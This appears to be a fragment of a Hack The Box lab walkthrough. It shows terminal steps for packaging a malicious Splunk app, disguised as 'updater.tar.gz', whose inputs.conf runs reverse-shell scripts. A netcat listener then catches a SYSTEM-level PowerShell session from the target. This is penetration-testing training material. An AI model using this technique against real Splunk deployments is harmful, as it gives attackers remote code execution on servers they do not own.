...
EssMack90@htb[/htb]`$ tree splunk_shell/  splunk_shell/ ├── bin └── default  2 directories, 0 files`
...
EssMack90@htb[/htb]`$ cat inputs.conf   [script://./bin/rev.py] disabled = 0   interval = 10   sourcetype = shell   [script://.\bin\run.bat] disabled = 0 sourcetype = shell interval = 10`
...
EssMack90@htb[/htb]`$ tar -cvzf updater.tar.gz splunk_shell/  splunk_shell/ splunk_shell/bin/ splunk_shell/bin/rev.py splunk_shell/bin/run.bat splunk_shell/bin/run.ps1 splunk_shell/default/ splunk_shell/default/inputs.conf`
...
EssMack90@htb[/htb]`$ sudo nc -lnvp 443  listening on [any] 443 ...`
...
EssMack90@htb[/htb]`$ sudo nc -lnvp 443  listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145   PS C:\Windows\system32> whoami  nt authority\system   PS C:\Windows\system32> hostname  APP03   PS C:\Windows\system32>`
